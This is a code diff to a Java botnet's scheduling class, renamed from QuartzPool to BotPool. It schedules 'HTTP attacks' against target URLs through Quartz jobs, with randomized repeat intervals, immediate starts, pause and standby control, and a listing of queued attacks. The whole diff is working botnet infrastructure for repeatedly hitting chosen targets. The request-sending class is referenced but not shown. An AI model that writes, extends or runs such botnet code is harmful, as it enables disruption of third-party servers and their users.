@@ -28,6 +28,7 @@ package com.acmutv.botnet.core.exec;
 
 import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.attack.QuartzHttpAttacker;
+import com.acmutv.botnet.tool.net.HttpMethod;
 import lombok.Data;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -36,7 +37,11 @@ import org.quartz.impl.StdSchedulerFactory;
 import org.quartz.impl.calendar.CronCalendar;
 import org.quartz.impl.matchers.GroupMatcher;
 
+import java.net.URL;
 import java.text.ParseException;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Set;
 import java.util.concurrent.ExecutorService;
 
 /**
@@ -47,9 +52,9 @@ import java.util.concurrent.ExecutorService;
  * @see ExecutorService
  */
 @Data
-public class QuartzPool {
+public class BotPool {
 
-  private static final Logger LOGGER = LogManager.getLogger(QuartzPool.class);
+  private static final Logger LOGGER = LogManager.getLogger(BotPool.class);
 
   /**
    * The name of the job group of all jobs performing HTTP attacks.
@@ -80,9 +85,39 @@ public class QuartzPool {
    * Construct a new pool, allocating a new Quartz scheduler.
    * @throws SchedulerException when the Quartz scheduler cannot be created.
    */
-  public QuartzPool() throws SchedulerException {
+  public BotPool() throws SchedulerException {
+    LOGGER.trace("Starting scheduler...");
     final SchedulerFactory factory = new StdSchedulerFactory();
     this.scheduler = factory.getScheduler();
+    this.scheduler.start();
+    LOGGER.trace("Scheduler started");
+  }
+
+  /**
+   * Checks if the pool is active.
+   * @return true if the pool is active; false,otherwise.
+   * @throws SchedulerException when pool status cannot be checked.
+   */
+  public boolean isActive() throws SchedulerException {
+    return !this.isSleeping() && !this.isShutdown();
+  }
+
+  /**
+   * Checks if the pool is sleeping.
+   * @return true if the pool is sleeping; false, otherwise.
+   * @throws SchedulerException when pool status cannot be checked.
+   */
+  public boolean isSleeping() throws SchedulerException {
+    return this.scheduler.isInStandbyMode();
+  }
+
+  /**
+   * Checks if the pool is shut down.
+   * @return true if the pool is shut down; false, otherwise.
+   * @throws SchedulerException when pool status cannot be checked.
+   */
+  public boolean isShutdown() throws SchedulerException {
+    return this.scheduler.isShutdown();
   }
 
   /**
@@ -91,8 +126,10 @@ public class QuartzPool {
    * @throws SchedulerException when the attack cannot be scheduled.
    */
   public void scheduleAttackHttp(HttpAttack attack) throws SchedulerException {
-    final JobKey jobKey = JobKey.jobKey(JOB_GROUP_ATTACKS_HTTP);
-    final TriggerKey triggerKey = TriggerKey.triggerKey(JOB_GROUP_ATTACKS_HTTP);
+    LOGGER.trace("Scheduling {}...", attack);
+    final String jname = String.format("%s.%d", attack.getTarget(), System.currentTimeMillis());
+    final JobKey jobKey = JobKey.jobKey(jname, JOB_GROUP_ATTACKS_HTTP);
+    final TriggerKey triggerKey = TriggerKey.triggerKey(jname, JOB_GROUP_ATTACKS_HTTP);
 
     @SuppressWarnings("MismatchedQueryAndUpdateOfCollection") JobDataMap jdata = new JobDataMap();
     jdata.put("method", attack.getMethod());
@@ -103,18 +140,24 @@ public class QuartzPool {
 
     JobDetail job = JobBuilder.newJob(QuartzHttpAttacker.class)
         .withIdentity(jobKey)
+        .usingJobData(jdata)
         .build();
 
-    final long intervalMillis = attack.getPeriod().getRandomDuration().toMillis();
-    final int repetitions = attack.getExecutions() - 1;
+    TriggerBuilder tb = TriggerBuilder.newTrigger().withIdentity(triggerKey);
 
-    Trigger trigger = TriggerBuilder.newTrigger()
-        .withIdentity(triggerKey)
-        .withSchedule(SimpleScheduleBuilder.simpleSchedule()
-            .withIntervalInMilliseconds(intervalMillis)
-            .withRepeatCount(repetitions)
-        )
-        .build();
+    if (attack.getExecutions() > 1) {
+      final long intervalMillis = attack.getPeriod().getRandomDuration().toMillis();
+      final int repetitions = attack.getExecutions() - 1;
+
+      tb.withSchedule(SimpleScheduleBuilder.simpleSchedule()
+              .withIntervalInMilliseconds(intervalMillis)
+              .withRepeatCount(repetitions)
+      );
+    } else {
+      tb.startNow();
+    }
+
+    Trigger trigger = tb.build();
 
     this.scheduler.scheduleJob(job, trigger);
   }
@@ -126,6 +169,7 @@ public class QuartzPool {
   public void pause() throws SchedulerException {
     LOGGER.trace("Pausing scheduler...");
     this.scheduler.pauseAll();
+    this.scheduler.standby();
     LOGGER.trace("Scheduler paused");
   }
 
@@ -135,6 +179,7 @@ public class QuartzPool {
    */
   public void resume() throws SchedulerException {
     LOGGER.trace("Resuming scheduler...");
+    this.scheduler.start();
     this.scheduler.resumeAll();
     LOGGER.trace("Scheduler resumed");
   }
@@ -170,9 +215,6 @@ public class QuartzPool {
     LOGGER.trace("Shutting down scheduler...");
     this.scheduler.shutdown(wait);
     LOGGER.trace("Scheduler shut down");
-    LOGGER.trace("Clearing scheduler data...");
-    this.scheduler.clear();
-    LOGGER.trace("Scheduler data cleared");
   }
 
   /**
@@ -201,5 +243,25 @@ public class QuartzPool {
     }
     this.scheduler.deleteCalendar(CALENDAR_SLEEP);
     LOGGER.trace("Sleep mode removed");
+  }
+
+  /**
+   * Return the list of scheduled attacks.
+   * @return the list of scheduled attacks.
+   * @throws SchedulerException when scheduled attacks cannot be retrieved
+   */
+  public List<HttpAttack> getScheduledAttacks() throws SchedulerException {
+    List<HttpAttack> attacks = new ArrayList<>();
+    Set<JobKey> jkeys = this.scheduler.getJobKeys(JOB_GROUP_ATTACKS);
+    for (JobKey jkey : jkeys) {
+      JobDetail jdetail = this.scheduler.getJobDetail(jkey);
+      JobDataMap jmap = jdetail.getJobDataMap();
+      HttpMethod method = (HttpMethod) jmap.get("method");
+      URL target = (URL) jmap.get("target");
+      HttpAttack attack = new HttpAttack(method, target);
+      //TODO
+      attacks.add(attack);
+    }
+    return attacks;
   }
 }
